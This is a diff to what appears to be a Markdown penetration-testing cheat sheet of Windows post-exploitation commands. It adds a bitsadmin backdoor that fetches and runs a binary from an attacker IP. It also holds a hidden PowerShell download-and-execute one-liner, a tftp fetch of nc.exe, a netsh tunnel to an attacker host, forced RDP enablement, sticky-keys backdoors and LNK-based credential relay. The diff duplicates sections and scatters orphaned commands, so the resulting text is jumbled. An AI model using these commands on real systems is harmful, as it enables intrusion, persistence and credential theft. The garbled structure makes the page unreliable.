@@ -13,6 +13,26 @@ return false;
 
 Commands to run to maintain persistence after you have exploited it and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.
 
+
+### BITSADMIN Backdoor
+Slide #49 of [this slide deck](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607) starts a method of using the `bitsadmin` command (http://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx) to create a backdoor. The steps are as follows:
+
+#### Creating the backdoor
+<pre>
+c:\> bitsadmin /create mybackdoor
+c:\> bitsadmin /addfile mybackdoor http://[AttackerIP]/[AttackerBinary.exe] c:\windows\temp\[AttackerBinary.exe]
+c:\> bitsadmin /SETMINRETRYDELAY mybackdoor 86400
+c:\> bitsadmin /SETNOTIFYCMDLINE mybackdoor c:\windows\temp\[AttackerBinary.exe] NULL
+</pre>
+
+#### Checking to see if everything is set
+<pre>
+c:\> bitsadmin /getnotifycmdline mybackdoor
+c:\> bitsadmin /listfiles mybackdoor
+c:\> bitsadmin /RESUME mybackboor
+</pre>
+
+
 ### Firewall Exceptions
 When you modify a system to talk on the network, you may need to alter the Windows firewall so your traffic is not filtered. The `netsh` command can be used to do this as the command to enable Remote Desktop Protocol below shows:
 
@@ -20,18 +40,6 @@ When you modify a system to talk on the network, you may need to alter the Windo
 
 ### Allow a program to listen through the firewall
 Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html
-
-`netsh firewall add allowedprogram C:\nltest.exe mltest enable`
-
-### Open a port on the firewall
-Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html
-
-`netsh firewall add portopening tcp 2482 lt enable all`
-
-
-### Tunnel Traffic Natively with Windows
-`netsh int portproxy v4tov4 listenport=80 connecthost=[AttackerIP] connectport=80`
-
 
 ### Powershell Downloader
  * **Command with arguments**: `powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))"`
@@ -87,108 +95,52 @@ Remote Desktop allows a remote user to receive a graphical "desktop" of the targ
          sedenynetworklogonright =
     </pre>
 
- 1. Create another file named `enable_ts.reg` containing the contents below.
-
-
+ 1. Create another file named `enable_ts.reg` containing the contents below. 
 
     <pre>
-
      Windows Registry Editor Version 5.00
-
      [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
-
      "fDenyTSConnections"=dword:00000000
-
      "TSEnabled"=dword:00000001
-
      "TSUserEnabled"=dword:00000000
-
     </pre>
 
-
-
  1. On the remote system, execute the following commands:
-
-
-```
-c:\> sc config termservice start= auto sc config termservice start= auto
-
+      
+    <pre>c:\> sc config termservice start= auto sc config termservice start= auto
 c:\> regedit /s enable_ts.reg
-
 c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\new.secedit.sdb
-
 c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\orig.secedit.sdb
-
 c:\> secedit /configure /db new.secedit.sdb /cfg fix_ts_policy.ini
-
 c:\> gpupdate /Force
-
 c:\> net start "terminal services"
-```
-
-
-
-
-
-### Scheduler
-
-The [Windows scheduler](http://support.microsoft.com/kb/313565) can be used to further compromise a system. It usually runs at the SYSTEM account privilege level. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 58)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely schedule tasks using the commands below.
-
-
-
-<pre>
-
-c:\> net use \\[TargetIP]\ipc$ password /user:username
-
-c:\> at \\[TargetIP] 12:00 pm command
-
 </pre>
 
 
+### Scheduler
+The [Windows scheduler](http://support.microsoft.com/kb/313565) can be used to further compromise a system. It usually runs at the SYSTEM account privilege level. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 58)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely schedule tasks using the commands below.
+
+<pre>
+c:\> net use \\[TargetIP]\ipc$ password /user:username
+c:\> at \\[TargetIP] 12:00 pm command
+</pre>
 
 An example you might run on the remote system might be: `at \\192.168.1.1 12:00pm tftp -I [MyIP] GET nc.exe`
 
 
-### Scheduling tasks to run under special conditions
-
-One can schedule tasks to run under certain conditions such as when a user logs into the computer or when the computer is idle
-with the schtasks command. This can be done by any user and includes the following additional conditions which can come in handy:
-
-* ONIDLE -> Run a command once the system enters an idle state
-* ONLOGON -> Run a command when a user logs into the system
-* ONSTART -> Run a command when the system starts up
- 
-If you would like more information on the various command line options for this tool, Microsoft describes them in great
-detail at: [https://technet.microsoft.com/en-us/library/cc725744.aspx#BKMK_create](https://technet.microsoft.com/en-us/library/cc725744.aspx#BKMK_create)
-
-
-
 ### Sticky Keys (Requires reboot)
-
-Sticky keys on Windows systems are activated when the user presses the SHIFT key 5 times. Here, according to the [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), you replace the sethc.exe binary with your own binary (cmd.exe maybe?) and, when SHIFT is pressed 5 times, your binary is executed. Your binary will execute as SYSTEM and needs to replace the `%WINDIR%\System32\sethc.exe`.
-
-
+Sticky keys on Windows systems are activated when the user presses the SHIFT key 5 times. Here, according to the [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), you replace the sethc.exe binary with your own binary (cmd.exe maybe?) and, when SHIFT is pressed 5 times, your binary is executed. Your binary will execute as SYSTEM and needs to replace the `%WINDIR%\System32\sethc.exe`. 
 
 Some caveats:
-
 * If NLA (Network Layer Authentication) is enabled, this won't work
-
 * If RDP (Remote Desktop Protocol) is disabled, this won't work
 
 
-
-
-
 ### Sticky Keys (No reboot)
-
-This technique uses registry entries to switch the binary that the sticky keys executes. Its real advantage is that it does not require a reboot for the switch to take place.
-
+This technique uses registry entries to switch the binary that the sticky keys executes. Its real advantage is that it does not require a reboot for the switch to take place. 
 * In the `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` make a key called `sethc.exe`
-
 * Make a REG_SZ value called "Debugger" (Ensure it is capitalized)
-
 * For the "Debugger" REG_SZ, make it have a value of your binary
-
 * Press SHIFT 5 times and your binary should be executed
 
 ### Process Dumping For Passwords
@@ -247,3 +199,76 @@ To do this one simply needs to take the following steps:
 * 
 
 Details on how this works are included in Microsoft's documentation at [https://msdn.microsoft.com/en-us/library/windows/desktop/ms721882%28v=vs.85%29.aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms721882%28v=vs.85%29.aspx)
+
+`netsh firewall add allowedprogram C:\nltest.exe mltest enable`
+
+### Open a port on the firewall
+Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html
+
+`netsh firewall add portopening tcp 2482 lt enable all`
+
+
+### Tunnel Traffic Natively with Windows
+`netsh int portproxy v4tov4 listenport=80 connecthost=[AttackerIP] connectport=80`
+
+
+### LNK (Shortcuts with UNC Icons #61
+If you are on an internal penetration test and either exploit a machine or find an open share, you can create an LNK file with an icon that points at a nonexistent share on your attacking machine's IP and use SMB_Relay to replay those credentials to a system in which we've identified by one means or another as an 'important' host to get on.
+
+Attacker uploads malicious LNK file to network share on FILE SHARE
+
+Victim views it on WORKSTATION that initiates an connection to ATTACKER
+
+Attacker relays those authentication attempts to FILE SHARE, gaining code execution if 'Victim' is an admin on FILE SHARE
+
+If not, then NetNTLM are still visible in the logs and can be attempted to crack, or just wait for more people to view the LNK file on the public share, and hope that an admin comes by at some point.
+
+Your mileage will vary based on where you put the LNK file.
+
+
+ 1. Create another file named `enable_ts.reg` containing the contents below. 
+
+    <pre>
+     Windows Registry Editor Version 5.00
+     [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
+     "fDenyTSConnections"=dword:00000000
+     "TSEnabled"=dword:00000001
+     "TSUserEnabled"=dword:00000000
+    </pre>
+
+ 1. On the remote system, execute the following commands:
+      
+    <pre>c:\> sc config termservice start= auto sc config termservice start= auto
+    c:\> regedit /s enable_ts.reg
+    c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\new.secedit.sdb
+    c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\orig.secedit.sdb
+    c:\> secedit /configure /db new.secedit.sdb /cfg fix_ts_policy.ini
+    c:\> gpupdate /Force
+    c:\> net start "terminal services"
+    </pre>
+
+
+### Scheduler
+The [Windows scheduler](http://support.microsoft.com/kb/313565) can be used to further compromise a system. It usually runs at the SYSTEM account privilege level. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 58)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely schedule tasks using the commands below.
+
+<pre>
+c:\> net use \\[TargetIP]\ipc$ password /user:username
+c:\> at \\[TargetIP] 12:00 pm command
+</pre>
+
+An example you might run on the remote system might be: `at \\192.168.1.1 12:00pm tftp -I [MyIP] GET nc.exe`
+
+
+### Sticky Keys (Requires reboot)
+Sticky keys on Windows systems are activated when the user presses the SHIFT key 5 times. Here, according to the [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), you replace the sethc.exe binary with your own binary (cmd.exe maybe?) and, when SHIFT is pressed 5 times, your binary is executed. Your binary will execute as SYSTEM and needs to replace the `%WINDIR%\System32\sethc.exe`. 
+
+Some caveats:
+* If NLA (Network Layer Authentication) is enabled, this won't work
+* If RDP (Remote Desktop Protocol) is disabled, this won't work
+
+
+### Sticky Keys (No reboot)
+This technique uses registry entries to switch the binary that the sticky keys executes. Its real advantage is that it does not require a reboot for the switch to take place. 
+* In the `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` make a key called `sethc.exe`
+* Make a REG_SZ value called "Debugger" (Ensure it is capitalized)
+* For the "Debugger" REG_SZ, make it have a value of your binary
